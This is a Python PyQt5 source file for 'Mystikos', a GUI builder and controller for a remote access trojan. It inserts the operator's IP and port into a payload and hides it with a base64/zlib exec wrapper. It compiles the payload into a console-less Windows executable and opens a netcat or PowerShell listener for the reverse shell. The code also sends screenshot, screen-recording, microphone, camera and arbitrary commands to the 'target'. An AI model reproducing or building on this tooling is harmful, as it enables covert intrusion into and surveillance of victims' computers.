import os
import webbrowser
from PyQt5.QtCore import Qt, QTimer, QPropertyAnimation, QRect, QProcess
from PyQt5.QtGui import QIcon, QPainter, QLinearGradient, QColor, QPalette
from PyQt5.QtWidgets import (
    QApplication, QWidget, QLabel, QFrame, QVBoxLayout, QFormLayout,
    QGridLayout, QPushButton, QLineEdit, QTextEdit, QGroupBox
)
import sys
import socket
import re
import subprocess
import json
from pathlib import Path

# Import our modules with correct paths
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
from config.config import Config
from logger import Logger
from payload_manager import PayloadManager
from rate_limiter import RateLimiter
from theme_manager import ThemeManager


class AnimatedBanner(QLabel):
    def __init__(self, text, parent=None):
        super().__init__(parent)
        self.full_text = text
        self.setFixedHeight(120)  # Fixed height for the banner
        self.setStyleSheet("""
            color: #2ecc71;
            font-family: 'Consolas';
            font-weight: bold;
            font-size: 14px;
            background-color: rgba(0, 0, 0, 0.7);
            border-radius: 5px;
            padding: 10px;
        """)
        self.setAlignment(Qt.AlignCenter)  # Center align the text
        self.setFixedWidth(800)  # Fixed width for the banner
        
        # Create animation
        self.animation = QPropertyAnimation(self, b"geometry")
        self.animation.setDuration(1000)  # 1 second animation
        
        # Set initial position (off-screen to the right)
        self.setGeometry(800, 0, 800, 120)
        
        # Start animation
        self.timer = QTimer(self)
        self.timer.timeout.connect(self.start_animation)
        self.timer.start(100)  # Small delay before starting animation

    def start_animation(self):
        self.timer.stop()
        self.setText(self.full_text)  # Set the full text immediately
        # Animate to center position
        self.animation.setStartValue(self.geometry())
        self.animation.setEndValue(QRect(0, 0, 800, 120))
        self.animation.start()


class GradientFrame(QFrame):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setMinimumHeight(5)
        
    def paintEvent(self, event):
        painter = QPainter(self)
        gradient = QLinearGradient(0, 0, self.width(), 0)
        gradient.setColorAt(0, QColor("#3498db"))
        gradient.setColorAt(0.5, QColor("#2ecc71"))
        gradient.setColorAt(1, QColor("#9b59b6"))
        painter.fillRect(event.rect(), gradient)


def window():
    app = QApplication(sys.argv)
    app.setStyle("Fusion")

    # Custom dark theme palette
    palette = QPalette()
    palette.setColor(QPalette.Window, QColor(34, 51, 34))  # Dark army green
    palette.setColor(QPalette.WindowText, Qt.white)
    palette.setColor(QPalette.Base, QColor(45, 68, 45))  # Slightly lighter army green
    palette.setColor(QPalette.AlternateBase, QColor(56, 85, 56))  # Even lighter army green
    palette.setColor(QPalette.ToolTipBase, Qt.white)
    palette.setColor(QPalette.ToolTipText, Qt.white)
    palette.setColor(QPalette.Text, Qt.white)
    palette.setColor(QPalette.Button, QColor(67, 102, 67))  # Button army green
    palette.setColor(QPalette.ButtonText, Qt.white)
    palette.setColor(QPalette.BrightText, Qt.red)
    palette.setColor(QPalette.Highlight, QColor(139, 69, 19))  # Saddle brown for highlights
    palette.setColor(QPalette.HighlightedText, Qt.white)
    app.setPalette(palette)

    # Window
    w = QWidget()
    w.setWindowTitle('Mystikos by @3MP3R0R')
    w.setWindowIcon(QIcon("icon.png"))
    w.setGeometry(300, 100, 850, 700)
    w.setMinimumSize(800, 650)

    # Define helper functions and signal handler methods here
    def is_valid_ip(ip):
        try:
            socket.inet_aton(ip)
            return True
        except socket.error:
            return False

    def is_valid_port(port):
        return port.isdigit() and 1 <= int(port) <= 65535

    # Define utility methods
    def replace_values(self):
        new_host = self.inp.text().strip()
        new_port = self.port.text().strip()

        if not is_valid_ip(new_host):
            self.output_box.append("[!] Invalid IP")
            return

        if not is_valid_port(new_port):
            self.output_box.append("[!] Invalid PORT")
            return

        try:
            # Create payload.py with the new values
            with open("payload.py", "r") as file:
                content = file.read()

            # Replace the default values in the main block
            content = content.replace('LHOST = os.getenv("LHOST", "127.0.0.1")', f'LHOST = os.getenv("LHOST", "{new_host}")')
            content = content.replace('LPORT = int(os.getenv("LPORT", "4444"))', f'LPORT = int(os.getenv("LPORT", "{new_port}"))')

            with open("payload.py", "w") as file:
                file.write(content)

            self.output_box.append("[+] Values replaced successfully!")
        except Exception as e:
            self.output_box.append(f"[!] Error: {e}")

    def obfuscate_action(self):
        try:
            with open("payload.py", "r") as file:
                content = file.read()

            # Create a more reliable obfuscation
            import base64
            import zlib
            
            # Compress and encode the content
            compressed = zlib.compress(content.encode())
            encoded = base64.b64encode(compressed)
            
            # Create the obfuscated wrapper
            obfuscated = f"""import base64,zlib;exec(zlib.decompress(base64.b64decode({repr(encoded)})))"""
            
            # Copy to clipboard
            clipboard = QApplication.clipboard()
            clipboard.setText(obfuscated)
            
            self.output_box.append("[+] Payload obfuscated and copied to clipboard")
            self.output_box.append("[*] You can now paste the obfuscated code into Step 3")

        except Exception as e:
            self.output_box.append(f"[!] Error during obfuscation: {e}")

    def compile_payload(self):
        payload_name_value = self.name.text().strip()

        if not payload_name_value:
           self.output_box.append("[!] Please set the Payload Name before compiling.")
           return

        if not os.path.exists("payload.py"):
            self.output_box.append("[!] payload.py not found. Please generate the payload first.")
            return

        self.output_box.append("[*] Starting compilation process...")
        self.output_box.append("[*] This might take a few moments...")

        try:
            # Build the command
            cmd = [
                "pyinstaller",
                "--onefile",           # no folders
                "--noconsole",         # no console window
                "--clean",             # clean PyInstaller cache
                "--name", payload_name_value,
                "payload.py"
            ]

            # Run the command with real-time output
            process = QProcess()
            process.setProcessChannelMode(QProcess.MergedChannels)
            
            # Connect to output
            def handle_output():
                output = process.readAllStandardOutput().data().decode().strip()
                if output:
                    self.output_box.append(f"[*] {output}")
            
            process.readyReadStandardOutput.connect(handle_output)
            
            # Start the process
            process.start("pyinstaller", cmd[1:])  # Skip the first element (pyinstaller)
            
            # Wait for completion with timeout
            if not process.waitForFinished(300000):  # 5 minute timeout
                process.kill()
                self.output_box.append("[!] Compilation timed out after 5 minutes")
                return

            # Check result
            if process.exitCode() == 0:
                exe_path = os.path.join("dist", f"{payload_name_value}.exe")
                if os.path.exists(exe_path):
                    # Move .exe to current directory
                    final_path = os.path.join(os.getcwd(), f"{payload_name_value}.exe")
                    try:
                        os.replace(exe_path, final_path)
                        self.output_box.append(f"[+] Compilation completed successfully!")
                        self.output_box.append(f"[+] Executable created: {payload_name_value}.exe")
                        
                        # Verify the executable
                        if os.path.getsize(final_path) > 0:
                            self.output_box.append(f"[+] Executable size: {os.path.getsize(final_path) / 1024:.2f} KB")
                        else:
                            self.output_box.append("[!] Warning: Executable file is empty")
                    except Exception as e:
                        self.output_box.append(f"[!] Error moving executable: {e}")
                else:
                    self.output_box.append("[!] Compilation failed: Executable not found in dist folder")
            else:
                self.output_box.append(f"[!] Compilation failed with exit code {process.exitCode()}")
                error_output = process.readAllStandardError().data().decode().strip()
                if error_output:
                    self.output_box.append(f"[!] Error details: {error_output}")

            # Clean up build files
            self.output_box.append("[*] Cleaning up build files...")
            cleanup_folders = ["build", "__pycache__", "dist"]
            for folder in cleanup_folders:
                if os.path.exists(folder):
                    try:
                        if os.path.isdir(folder):
                            subprocess.run(['rmdir', '/S', '/Q', folder], shell=True, check=True)
                            self.output_box.append(f"[+] Cleaned up {folder}")
                    except subprocess.CalledProcessError as e:
                        self.output_box.append(f"[!] Failed to clean up {folder}: {e}")

            # Clean up spec file
            spec_file = f"{payload_name_value}.spec"
            if os.path.exists(spec_file):
                try:
                    os.remove(spec_file)
                    self.output_box.append("[+] Cleaned up spec file")
                except Exception as e:
                    self.output_box.append(f"[!] Failed to clean up spec file: {e}")

        except Exception as e:
            self.output_box.append(f"[!] Compilation error: {e}")

    def write_payload(self):
        try:
            clipboard = QApplication.clipboard()
            content = clipboard.text()

            if not content.strip():
                self.output_box.append("[!] Clipboard is empty.")
                return

            with open("payload.py", "w", encoding='utf-8') as f:
                f.write(content)

            self.output_box.append("[+] Clipboard content written to payload.py")
        except Exception as e:
            self.output_box.append(f"[!] Failed to write to file: {e}")

    # Define remote control methods
    def send_command(self):
        if not hasattr(self, 'nc_process') or self.nc_process is None:
            self.output_box.append("[!] No active connection")
            return

        command = self.command_input.text().strip()
        if not command:
            return

        try:
            # Send command to the process
            self.nc_process.write(f"{command}\n".encode())
            self.command_input.clear()
        except Exception as e:
            self.output_box.append(f"[!] Error sending command: {e}")

    def take_screenshot(self):
        if not hasattr(self, 'nc_process') or self.nc_process is None:
            self.output_box.append("[!] No active connection")
            return

        try:
            self.nc_process.write("screenshot\n".encode())
            self.output_box.append("[*] Screenshot command sent")
        except Exception as e:
            self.output_box.append(f"[!] Error sending screenshot command: {e}")

    def toggle_screen_recording(self):
        if not hasattr(self, 'nc_process') or self.nc_process is None:
            self.output_box.append("[!] No active connection")
            return

        try:
            if self.screen_record_btn.text() == 'Start Recording':
                self.nc_process.write("record_start\n".encode())
                self.screen_record_btn.setText('Stop Recording')
                self.output_box.append("[*] Screen recording started")
            else:
                self.nc_process.write("record_stop\n".encode())
                self.screen_record_btn.setText('Start Recording')
                self.output_box.append("[*] Screen recording stopped")
        except Exception as e:
            self.output_box.append(f"[!] Error toggling screen recording: {e}")

    def toggle_microphone(self):
        if not hasattr(self, 'nc_process') or self.nc_process is None:
            self.output_box.append("[!] No active connection")
            return

        try:
            if self.mic_btn.text() == 'Enable Mic':
                self.nc_process.write("mic_start\n".encode())
                self.mic_btn.setText('Disable Mic')
                self.output_box.append("[*] Microphone enabled")
            else:
                self.nc_process.write("mic_stop\n".encode())
                self.mic_btn.setText('Enable Mic')
                self.output_box.append("[*] Microphone disabled")
        except Exception as e:
            self.output_box.append(f"[!] Error toggling microphone: {e}")

    def toggle_camera(self):
        if not hasattr(self, 'nc_process') or self.nc_process is None:
            self.output_box.append("[!] No active connection")
            return

        try:
            if self.camera_btn.text() == 'Enable Camera':
                self.nc_process.write("camera_start\n".encode())
                self.camera_btn.setText('Disable Camera')
                self.output_box.append("[*] Camera enabled")
            else:
                self.nc_process.write("camera_stop\n".encode())
                self.camera_btn.setText('Enable Camera')
                self.output_box.append("[*] Camera disabled")
        except Exception as e:
            self.output_box.append(f"[!] Error toggling camera: {e}")

    # Define process handling methods
    def process_ready_read_stdout(self):
        if hasattr(self, 'nc_process') and self.nc_process is not None:
            self.output_box.append("[Target]: " + self.nc_process.readAllStandardOutput().data().decode().strip())

    def process_ready_read_stderr(self):
        if hasattr(self, 'nc_process') and self.nc_process is not None:
            self.output_box.append("[Target ERROR]: " + self.nc_process.readAllStandardError().data().decode().strip())

    def on_process_finished(self, exitCode, exitStatus):
        self.output_box.append(f"[*] Listener process finished with exit code {exitCode}")
        self.stop_listener_btn.setEnabled(False)
        self.nc_listener_btn.setEnabled(True)
        
        # Clean up the process reference
        if hasattr(self, 'nc_process') and self.nc_process is not None:
            try:
                # Store process reference before cleanup
                process = self.nc_process
                self.nc_process = None  # Clear reference first
                
                # Safely disconnect signals
                try:
                    if process.state() != QProcess.NotRunning:
                        process.readyReadStandardOutput.disconnect()
                        process.readyReadStandardError.disconnect()
                        process.finished.disconnect()
                except (TypeError, RuntimeError):
                    pass  # Ignore if signals weren't connected or process is already dead
            except Exception as e:
                self.output_box.append(f"[!] Error during process cleanup: {e}")

    # Define start listener method
    def start_nc_listener(self):
        try:
            port = self.port.text().strip()
            if not is_valid_port(port):
                self.output_box.append("[!] Invalid port number")
                return

            # Create a new process
            process = QProcess()
            process.setProcessChannelMode(QProcess.MergedChannels)

            # Connect signals
            process.readyReadStandardOutput.connect(lambda: self.process_ready_read_stdout())
            process.readyReadStandardError.connect(lambda: self.process_ready_read_stderr())
            process.finished.connect(lambda code, status: self.on_process_finished(code, status))

            # Set up the terminal window
            if sys.platform == "win32":
                # For Windows - using PowerShell
                powershell_cmd = f"""
                try {{
                    $ErrorActionPreference = 'Stop'
                    $listener = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Any, {port})
                    $listener.Start()
                    Write-Host '[*] Listening on port {port}...'
                    
                    try {{
                        $client = $listener.AcceptTcpClient()
                        Write-Host '[+] Connection received from ' + $client.Client.RemoteEndPoint
                        $stream = $client.GetStream()
                        $reader = New-Object System.IO.StreamReader($stream)
                        $writer = New-Object System.IO.StreamWriter($stream)
                        $writer.AutoFlush = $true
                        
                        # Start background job to read output
                        $job = Start-Job -ScriptBlock {{
                            param($r)
                            while ($true) {{
                                try {{
                                    Write-Host '[*] Attempting to read line from stream...'
                                    $data = $r.ReadLine()
                                    Write-Host "[*] Read data: '$data'"
                                    if ($data -ne $null) {{
                                        Write-Host ('[Target]: ' + $data)
                                    }} else {{
                                        Write-Host '[*] Read null or empty data, breaking loop.'
                                        break
                                    }}
                                }} catch {{
                                    Write-Host '[-] Error reading from stream: ' + $_.Exception.Message
                                    Write-Host '[-] Error details: ' + $_.InvocationExtent.Text
                                    break
                                }}
                            }}
                        }} -ArgumentList $reader
                        
                        # Main interaction loop
                        while ($client.Connected) {{
                            $input_line = Read-Host -Prompt ''
                            if ($input_line -eq 'exit') {{
                                break
                            }}
                            try {{
                                $writer.WriteLine($input_line)
                            }} catch {{
                                Write-Host '[-] Error sending command: ' + $_.Exception.Message
                                Write-Host '[-] Error details: ' + $_.InvocationExtent.Text
                                break
                            }}
                        }}
                    }} catch {{
                        Write-Host '[-] Error accepting connection or processing stream: ' + $_.Exception.Message
                        Write-Host '[-] Error details: ' + $_.InvocationExtent.Text
                    }} finally {{
                        if ($client) {{ $client.Close() }}
                        if ($listener) {{ $listener.Stop() }}
                        if ($job) {{ Remove-Job $job -Force }}
                        Write-Host '[*] Listener stopped.'
                    }}
                }} catch {{
                    Write-Host '[-] Error starting listener: ' + $_.Exception.Message
                    Write-Host 'Press any key to exit...'
                    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
                }}
                """
                process.start("powershell.exe", ["-NoExit", "-Command", powershell_cmd])
            else:
                # For Linux/Mac
                process.start("x-terminal-emulator", ["-e", f"nc -lvnp {port}"])

            # Store the process in the window
            self.nc_process = process

            self.output_box.append(f"[+] Listener started on port {port}")
            self.output_box.append("[*] Waiting for connection...")
            self.stop_listener_btn.setEnabled(True)
            self.nc_listener_btn.setEnabled(False)

            # Enable remote control features
            self.screenshot_btn.setEnabled(True)
            self.screen_record_btn.setEnabled(True)
            self.mic_btn.setEnabled(True)
            self.camera_btn.setEnabled(True)
            self.command_input.setEnabled(True)
            self.send_command_btn.setEnabled(True)
        except Exception as e:
            self.output_box.append(f"[!] Error: {e}")

    # Define stop listener method
    def stop_nc_listener(self):
        if hasattr(self, 'nc_process') and self.nc_process is not None:
            try:
                # Store process reference before cleanup
                process = self.nc_process
                self.nc_process = None  # Clear reference first to prevent race conditions
                
                # First try graceful termination
                process.terminate()
                
                # Wait for process to terminate (with timeout)
                if not process.waitForFinished(3000):  # 3 second timeout
                    # Force kill if graceful termination fails
                    process.kill()
                    process.waitForFinished(1000)  # Wait for kill to complete
                
                # Clean up process reference and signals
                try:
                    if process.state() != QProcess.NotRunning:
                        process.readyReadStandardOutput.disconnect()
                        process.readyReadStandardError.disconnect()
                        process.finished.disconnect()
                except (TypeError, RuntimeError):
                    pass  # Ignore if signals weren't connected or process is already dead
                
                self.output_box.append("[+] Listener stopped successfully")
                self.stop_listener_btn.setEnabled(False)
                self.nc_listener_btn.setEnabled(True)

                # Disable remote control features
                self.screenshot_btn.setEnabled(False)
                self.screen_record_btn.setEnabled(False)
                self.mic_btn.setEnabled(False)
                self.camera_btn.setEnabled(False)
                self.command_input.setEnabled(False)
                self.send_command_btn.setEnabled(False)
            except Exception as e:
                self.output_box.append(f"[!] Error stopping listener: {e}")
                # Ensure buttons are in correct state even if error occurs
                self.stop_listener_btn.setEnabled(False)
                self.nc_listener_btn.setEnabled(True)
        else:
            self.output_box.append("[!] No listener is running.")

    # Main layout
    main_layout = QVBoxLayout()
    main_layout.setContentsMargins(15, 15, 15, 15)
    main_layout.setSpacing(15)

    # Banner
    banner_text = """
███╗   ███╗██╗   ██╗███████╗████████╗██╗██╗  ██╗ ██████╗ ███████╗
████╗ ████║╚██╗ ██╔╝██╔════╝╚══██╔══╝██║██║ ██╔╝██╔═══██╗██╔════╝
██╔████╔██║ ╚████╔╝ ███████╗   ██║   ██║█████╔╝ ██║   ██║███████╗
██║╚██╔╝██║  ╚██╔╝  ╚════██║   ██║   ██║██╔═██╗ ██║   ██║╚════██║
██║ ╚═╝ ██║   ██║   ███████║   ██║   ██║██║  ██╗╚██████╔╝███████║
╚═╝     ╚═╝   ╚═╝   ╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝
                                                                 
    """
    banner = AnimatedBanner(banner_text)
    main_layout.addWidget(banner)

    # Gradient separator
    separator = GradientFrame()
    separator.setFixedHeight(3)
    main_layout.addWidget(separator)

    # Form layout
    form_layout = QFormLayout()
    form_layout.setContentsMargins(20, 10, 20, 10)
    form_layout.setVerticalSpacing(15)
    form_layout.setHorizontalSpacing(20)

    # Custom styles
    label_style = """
    QLabel {
        font-weight: bold;
        color: #ffffff;
        font-size: 14px;
        padding: 3px 0;
    }
    """
    
    input_style = """
    QLineEdit, QTextEdit {
        background-color: #2a3f2a;
        color: #ffffff;
        border: 1px solid #3d5c3d;
        border-radius: 4px;
        padding: 8px;
        font-size: 13px;
        selection-background-color: #8b4513;
    }
    QLineEdit:focus, QTextEdit:focus {
        border: 1px solid #8b4513;
    }
    """
    
    button_style = """
    QPushButton {
        background-color: #8B0000;
        color: white;
        font-weight: bold;
        border: none;
        border-radius: 5px;
        padding: 5px 8px;
        font-size: 11px;
        min-width: 90px;
        min-height: 22px;
    }
    QPushButton:hover {
        background-color: #A52A2A;
    }
    QPushButton:pressed {
        background-color: #800000;
    }
    """
    
    # LHOST
    lhost_label = QLabel("LHOST:")
    lhost_label.setStyleSheet(label_style)
    inp = QLineEdit()
    inp.setPlaceholderText("Enter your IP address")
    inp.setStyleSheet(input_style)

    # LPORT
    lport_label = QLabel("LPORT:")
    lport_label.setStyleSheet(label_style)
    port = QLineEdit()
    port.setPlaceholderText("Enter port number")
    port.setStyleSheet(input_style)

    # Payload Name
    name_label = QLabel("Payload Name:")
    name_label.setStyleSheet(label_style)
    name = QLineEdit()
    name.setPlaceholderText("Enter output filename")
    name.setStyleSheet(input_style)

    # Add form fields
    form_layout.addRow(lhost_label, inp)
    form_layout.addRow(lport_label, port)
    form_layout.addRow(name_label, name)

    # Button grid
    button_grid = QGridLayout()
    button_grid.setSpacing(9)
    button_grid.setContentsMargins(0, 7, 0, 7)

    # Buttons with step numbers in their text
    replace_btn = QPushButton('Step 1: Replace Values')
    replace_btn.setIcon(QIcon.fromTheme("system-run"))
    replace_btn.setStyleSheet(button_style)

    obfuscate_btn = QPushButton('Step 2: Obfuscate Code')
    obfuscate_btn.setIcon(QIcon.fromTheme("applications-other"))
    obfuscate_btn.setStyleSheet(button_style)

    write_btn = QPushButton('Step 3: Write to File')
    write_btn.setIcon(QIcon.fromTheme("document-save"))
    write_btn.setStyleSheet(button_style)

    compile_btn = QPushButton('Step 4: Compile Payload')
    compile_btn.setIcon(QIcon.fromTheme("applications-other"))
    compile_btn.setStyleSheet(button_style)

    nc_listener_btn = QPushButton('Step 5: Start Listener')
    nc_listener_btn.setIcon(QIcon.fromTheme("network-wired"))
    nc_listener_btn.setStyleSheet(button_style)

    # Add Stop Listener button
    stop_listener_btn = QPushButton('Stop Listener')
    stop_listener_btn.setIcon(QIcon.fromTheme("process-stop"))
    stop_listener_btn.setStyleSheet(button_style)
    stop_listener_btn.setEnabled(False)

    # Add instructions label
    instructions = QLabel("""
    Instructions:
    1. Set LHOST and LPORT, then click Step 1
    2. Click Step 2 to open obfuscator website
    3. Copy obfuscated code and click Step 3
    4. Enter payload name and click Step 4
    5. Click Step 5 to begin monitoring
    """)
    instructions.setStyleSheet("""
        QLabel {
            color: #bdc3c7;
            font-size: 11px;
            padding: 10px;
            background-color: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }
    """)
    instructions.setWordWrap(True)
    button_grid.addWidget(replace_btn, 0, 0)
    button_grid.addWidget(obfuscate_btn, 0, 1)
    button_grid.addWidget(write_btn, 1, 0)
    button_grid.addWidget(compile_btn, 1, 1)
    button_grid.addWidget(nc_listener_btn, 2, 0)
    button_grid.addWidget(stop_listener_btn, 2, 1)
    button_grid.addWidget(instructions, 3, 0, 1, 2)

    # Style all buttons
    for btn in [replace_btn, obfuscate_btn, write_btn, compile_btn, nc_listener_btn, stop_listener_btn]:
        btn.setCursor(Qt.PointingHandCursor)

    # Output Display
    output_box = QTextEdit()
    output_box.setReadOnly(True)
    output_box.setStyleSheet("""
        QTextEdit {
            background-color: #2a3f2a;
            color: #ffffff;
            border: 1px solid #3d5c3d;
            border-radius: 4px;
            padding: 10px;
            font-family: 'Consolas';
            font-size: 12px;
        }
    """)
    output_box.setFixedHeight(150)

    # Add everything to main layout
    main_layout.addLayout(form_layout)
    main_layout.addLayout(button_grid)
    main_layout.addWidget(output_box)

    w.setLayout(main_layout)
    
    # Center window
    frame_geo = w.frameGeometry()
    screen = QApplication.desktop().screenNumber(QApplication.desktop().cursor().pos())
    center_point = QApplication.desktop().screenGeometry(screen).center()
    frame_geo.moveCenter(center_point)
    w.move(frame_geo.topLeft())

    # Assign UI elements as attributes of the window object
    w.output_box = output_box
    w.stop_listener_btn = stop_listener_btn
    w.nc_listener_btn = nc_listener_btn
    w.inp = inp
    w.port = port
    w.name = name

    # Add new command buttons after the existing buttons
    remote_control_group = QGroupBox("Remote Control")
    remote_control_group.setStyleSheet("""
        QGroupBox {
            color: #ffffff;
            border: 1px solid #3d5c3d;
            border-radius: 5px;
            margin-top: 10px;
            font-weight: bold;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 10px;
            padding: 0 5px;
        }
    """)
    remote_control_layout = QGridLayout()
    remote_control_layout.setSpacing(10)

    # Screenshot button
    screenshot_btn = QPushButton('Take Screenshot')
    screenshot_btn.setIcon(QIcon.fromTheme("camera-photo"))
    screenshot_btn.setStyleSheet(button_style)
    screenshot_btn.setEnabled(False)

    # Screen record button
    screen_record_btn = QPushButton('Start Recording')
    screen_record_btn.setIcon(QIcon.fromTheme("media-record"))
    screen_record_btn.setStyleSheet(button_style)
    screen_record_btn.setEnabled(False)

    # Microphone control button
    mic_btn = QPushButton('Enable Mic')
    mic_btn.setIcon(QIcon.fromTheme("audio-input-microphone"))
    mic_btn.setStyleSheet(button_style)
    mic_btn.setEnabled(False)

    # Camera control button
    camera_btn = QPushButton('Enable Camera')
    camera_btn.setIcon(QIcon.fromTheme("camera-video"))
    camera_btn.setStyleSheet(button_style)
    camera_btn.setEnabled(False)

    # Add buttons to layout
    remote_control_layout.addWidget(screenshot_btn, 0, 0)
    remote_control_layout.addWidget(screen_record_btn, 0, 1)
    remote_control_layout.addWidget(mic_btn, 1, 0)
    remote_control_layout.addWidget(camera_btn, 1, 1)

    remote_control_group.setLayout(remote_control_layout)

    # Add remote control group to main layout after button_grid
    main_layout.addWidget(remote_control_group)

    # Add command input field
    command_input = QLineEdit()
    command_input.setPlaceholderText("Enter command to send to target...")
    command_input.setStyleSheet(input_style)
    command_input.setEnabled(False)
    main_layout.addWidget(command_input)

    # Add send command button
    send_command_btn = QPushButton('Send Command')
    send_command_btn.setIcon(QIcon.fromTheme("mail-send"))
    send_command_btn.setStyleSheet(button_style)
    send_command_btn.setEnabled(False)
    main_layout.addWidget(send_command_btn)

    # Add new attributes to window object
    w.screenshot_btn = screenshot_btn
    w.screen_record_btn = screen_record_btn
    w.mic_btn = mic_btn
    w.camera_btn = camera_btn
    w.command_input = command_input
    w.send_command_btn = send_command_btn

    # Add new methods to window object
    w.take_screenshot = take_screenshot.__get__(w, w.__class__)
    w.toggle_screen_recording = toggle_screen_recording.__get__(w, w.__class__)
    w.toggle_microphone = toggle_microphone.__get__(w, w.__class__)
    w.toggle_camera = toggle_camera.__get__(w, w.__class__)
    w.send_command = send_command.__get__(w, w.__class__)
    w.start_nc_listener = start_nc_listener.__get__(w, w.__class__)
    w.stop_nc_listener = stop_nc_listener.__get__(w, w.__class__)
    w.process_ready_read_stdout = process_ready_read_stdout.__get__(w, w.__class__)
    w.process_ready_read_stderr = process_ready_read_stderr.__get__(w, w.__class__)
    w.on_process_finished = on_process_finished.__get__(w, w.__class__)
    w.replace_values = replace_values.__get__(w, w.__class__)
    w.obfuscate_action = obfuscate_action.__get__(w, w.__class__)
    w.compile_payload = compile_payload.__get__(w, w.__class__)
    w.write_payload = write_payload.__get__(w, w.__class__)

    # Connect new buttons to their functions
    screenshot_btn.clicked.connect(w.take_screenshot)
    screen_record_btn.clicked.connect(w.toggle_screen_recording)
    mic_btn.clicked.connect(w.toggle_microphone)
    camera_btn.clicked.connect(w.toggle_camera)
    send_command_btn.clicked.connect(w.send_command)
    command_input.returnPressed.connect(w.send_command)

    # Connect original buttons to their functions
    replace_btn.clicked.connect(w.replace_values)
    obfuscate_btn.clicked.connect(w.obfuscate_action)
    nc_listener_btn.clicked.connect(w.start_nc_listener)
    compile_btn.clicked.connect(w.compile_payload)
    write_btn.clicked.connect(w.write_payload)
    stop_listener_btn.clicked.connect(w.stop_nc_listener)

    w.nc_process = None  # Store the netcat process

    w.show()
    sys.exit(app.exec_())


if __name__ == '__main__':
    window()